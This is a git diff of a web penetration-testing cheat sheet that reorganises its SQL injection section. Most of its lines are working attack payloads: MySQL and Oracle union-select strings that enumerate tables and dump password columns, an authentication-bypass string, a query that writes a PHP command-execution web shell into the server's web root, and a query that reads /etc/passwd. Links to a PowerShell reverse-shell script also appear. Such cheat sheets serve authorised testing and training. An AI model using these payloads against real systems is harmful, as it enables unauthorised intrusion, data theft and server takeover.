@@ -769,15 +769,14 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 
 ## SQL Injection
 ### SQL Injection - MySQL/MariaDB
-
--> get version
-```
--1 union select 1,2,version();#
-```
-	
 -> get number columns
 ```
 -1 order by 3;#
+```
+	
+-> get version
+```
+-1 union select 1,2,version();#
 ```
 	
 -> get database name
@@ -795,7 +794,23 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 -1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
 ```
 	
+-> dump
+```
+-1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
+```
 
+#### Webshell via SQLI - MySQL
+```
+LOAD_FILE('/etc/httpd/conf/httpd.conf')    
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
+```
+
+#### Reading Files via SQLI - MySQL
+e.g  
+```
+SELECT LOAD_FILE('/etc/passwd')
+```
+	
 ### WAF and Filter Bypass
 #### Query default:
 ```
@@ -826,18 +841,6 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 -> urlencode;  
 -> Scientifc Notation;  
 -> hexadecimal, substr, etc...  
-  
-### Webshell via SQLI - MySQL
-```
-LOAD_FILE('/etc/httpd/conf/httpd.conf')    
-select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
-```
- 
-### Reading Files via SQLI - MySQL
-e.g  
-```
-SELECT LOAD_FILE('/etc/passwd')
-```
 
 ### MSSQL Injection
 
@@ -858,22 +861,31 @@ SELECT LOAD_FILE('/etc/passwd')
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 ### Oracle SQL
-
 -> Bypass Authentication
 ```
 ' or 1=1--
 ```
-
--> Exploiting
+	
+-> get number columns
 ```
 ' order by 3--
-' union select null,table_name,null from all_tables--
-' union select null,column_name,null from all_tab_columns where table_name='WEB_USERS'--
-' union select null,column_name,null from all_tab_columns where table_name='WEB_ADMINS'--
-' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
-' union select null,PASSWORD,null from WEB_ADMINS--
 ```
-
+	
+-> get table name
+```
+' union select null,table_name,null from all_tables--
+```
+	
+-> get column name
+```
+' union select null,column_name,null from all_tab_columns where table_name='<table_name>'--
+```
+	
+-> dump
+```
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+```
+	
 ### Scripts Example
 -> Second-Order SQL Injection (query connector)  - Example (edit)
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
